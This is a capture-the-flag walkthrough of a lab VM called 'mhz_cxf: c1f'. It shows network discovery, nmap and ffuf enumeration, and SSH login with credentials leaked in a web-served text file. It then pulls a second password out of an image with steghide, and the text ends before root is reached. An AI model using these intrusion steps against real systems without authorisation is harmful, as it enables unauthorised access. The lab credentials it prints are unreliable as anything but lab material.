# mhz_cxf: c1f

### 1.Get VM IP

```bash
root@kali: arp-scan -I eth0 -l
Interface: eth0, type: EN10MB, MAC: 08:00:27:b2:e9:3f, IPv4: 192.168.56.102
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.56.1	0a:00:27:00:00:12	(Unknown: locally administered)
192.168.56.100	08:00:27:f2:81:70	PCS Systemtechnik GmbH
192.168.56.125	08:00:27:5a:e1:83	PCS Systemtechnik GmbH
```

The IP address is `192.168.56.125`, let's enumerate it

### 2.Enumeration

```bash
root@kali: nmap -sT -sV -sC -v -p- -oN nmap.out 192.168.56.125

Nmap scan report for 192.168.56.125
Host is up (0.00078s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 38:d9:3f:98:15:9a:cc:3e:7a:44:8d:f9:4d:78:fe:2c (RSA)
|   256 89:4e:38:77:78:a4:c3:6d:dc:39:c4:00:f8:a5:67:ed (ECDSA)
|_  256 7c:15:b9:18:fc:5c:75:aa:30:96:15:46:08:a9:83:fb (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 08:00:27:5A:E1:83 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

i tried to fuzz the system for any new files or directories :

```bash
root@kali: ffuf -w /root/wordlist/raft-medium-words.txt  -u http://192.168.56.125/FUZZ -e .txt,.php,.rar,.zip,.tar,.old,.js,.bak -fc 403

notes.txt               [Status: 200, Size: 86, Words: 16, Lines: 4, Duration: 1ms]
```

check notes.txt :

```text
1- i should finish my second lab 
2- i should delete the remb.txt file and remb2.txt
```

check `remb.txt` :

```text
first_stage:flagitifyoucan1234
```

it looks like a username and password.


### 3.Gaining Shell

Let's ssh to system using the username and password found previously :

```bash
root@kali: ssh first_stage@192.168.56.125
first_stage@192.168.56.125's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-96-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Apr 21 08:07:13 UTC 2024

  System load:  0.29              Processes:             91
  Usage of /:   39.9% of 9.78GB   Users logged in:       0
  Memory usage: 52%               IP address for enp0s3: 192.168.56.125
  Swap usage:   0%

23 packages can be updated.
0 updates are security updates.

$ id
uid=1001(first_stage) gid=1001(first_stage) groups=1001(first_stage)
```

### 4.Privilege Escalation (mhz_c1f)

first check /home directory and `/home/mhz_c1f/Paintings` :

```bash
'19th century American.jpeg'  'Russian beauty.jpeg'
'Frank McCarthy.jpeg'         'spinning the wool.jpeg'
```

these images should be transfered to you kali machine to check for any hidden data within them :

```bash
root@kali: scp first_stage@192.168.56.125:/home/mhz_c1f/Paintings/'19th century American.jpeg' .
root@kali: scp first_stage@192.168.56.125:/home/mhz_c1f/Paintings/'Russian beauty.jpeg' .
root@kali: scp first_stage@192.168.56.125:/home/mhz_c1f/Paintings/'Frank McCarthy.jpeg'  .
root@kali: scp first_stage@192.168.56.125:/home/mhz_c1f/Paintings/'spinning the wool.jpeg' .
```

check one by one by `steghide` and in the image `'spinning the wool.jpeg'`, you will find `remb2.txt` :

```bash
root@kali: teghide extract -sf 'spinning the wool.jpeg'
wrote extracted data to "remb2.txt".
```

and check the content of remb2.txt

```text
ooh , i know should delete this , but i cant' remember it 
screw me 

mhz_c1f:1@ec1f
```

there is another username and password






